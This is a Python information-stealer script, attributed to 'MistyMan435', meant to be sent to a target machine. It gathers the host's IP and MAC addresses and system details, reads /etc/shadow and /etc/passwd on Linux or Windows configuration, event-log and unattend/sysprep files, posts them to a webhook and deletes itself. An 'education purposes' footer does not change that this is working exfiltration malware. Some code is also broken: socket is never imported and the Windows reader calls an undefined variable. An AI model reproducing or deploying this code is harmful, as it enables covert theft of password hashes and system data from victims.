import sys
import platform
import uuid
import re
import requests
import os 
from getpass import getuser
# DEFINE THIS VARIABLE BEFORE SENDING TO THE TARGET

webhook_url = ""
current_username = getuser()

class checkSystem:
	def linuxCheck(self):
		if sys.platform == "linux":
			return True
		else:
			return False

	def windowsCheck(self):
		if sys.platform == "win32":
			return True
		else:
			return False

check = checkSystem()



linux_dataList = []
windows_dataList = []

linux_sensitive_files = ["/proc/version", "/etc/shadow", "/etc/passwd"]
windows_sensitive_files = ['/Windows/System32/drivers/etc/hosts', '/Windows/System32/win.ini', '/Windows/System32/debug/NetSetup.log', '/Windows/System32/config/AppEvent.Evt', '/Windows/System32/config/SecEvent.Evt', f'/Windows/{current_username}/unattend.txt', f'/Windows/{current_username}/unattend.xml', f'/Windows/{current_username}/unattended.xml', f'/Windows/{current_username}/sysprep.inf']

proc_info = platform.processor()
system_info = platform.system()
version_info = platform.version()

hostname = socket.gethostname()
private_ip = socket.gethostbyname(hostname)
ip = requests.get('https://api.ipify.org').text
mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))


def auto_delete_self():
	try:
		os.remove(sys.argv[0])
	except FileNotFoundError:
		pass

def linuxData():
	global linux_dataList

	for files in linux_sensitive_files:
		try:
			with open(files, "r") as f:
				linux_data = f.read()
				linux_dataList.append(linux_data)
		except FileNotFoundError:
			pass
		
		except:
			linux_dataList.append("N/A")


def windowsData():
	global windows_dataList
	for files in windows_sensitive_files:
		try:
			with open(files, "r") as w:
				windows_data = e.read()
				windows_dataList.append(windows_data)
		except FileNotFoundError:
			pass

		except:
			windows_dataList.append("N/A")


if check.linuxCheck():
	linuxData()
	operatingSys = linux_dataList[0]

	linuxDataPost = {
	  "embeds": [
	    {
	      "author": {
	        "name": "Developer - MistyMan435",
	        "url": "https://github.com/Supreme-coder929",
	      },
	      "title": f"INFO LOGGED - {ip} - {hostname}",
	      "description": f'''

	      **Operating System** - {operatingSys}
		  **Processor** - {proc_info}
		  **System** - {system_info}
	      **Version** - {version_info}
	      **Public IP** - {ip}
	      **Private IP** - {private_ip}
	      **MAC Address** - {mac_address}
	      **ETC Shadow Hashes** - {linux_dataList[1]}
	      **ETC Passwd** - {linux_dataList[2]}




	      ''',
	      "color": 3070781,
	      "footer": {
	        "text": "Only for education purposes.",
	      }
	    }
	  ]
	}
		
	r = requests.post(webhook_url, json=linuxDataPost)

elif check.windowsCheck():
	windowsData()

	windowsDataPost = {
	  "embeds": [
	    {
	      "author": {
	        "name": "Developer - MistyMan435",
	        "url": "https://github.com/Supreme-coder929",
	      },
	      "title": f"INFO LOGGED - {ip} - {hostname}",
	      "description": f'''

	      **Operating System** - {sys.platform}
		  **Processor** - {proc_info}
		  **System** - {system_info}
	      **Version** - {version_info}
	      **Public IP** - {ip}
	      **Private IP** - {private_ip}
	      **MAC Address** - {mac_address}
	  	  **ETC Hosts** - {windows_dataList[0]}
	  	  **External Info** - {windows_dataList[1:]}


	      ''',
	      "color": 3070781,
	      "footer": {
	        "text": "Only for education purposes.",
	      }
	    }
	  ]
	}
	r = requests.post(webhook_url, json=windowsDataPost)


auto_delete_self()
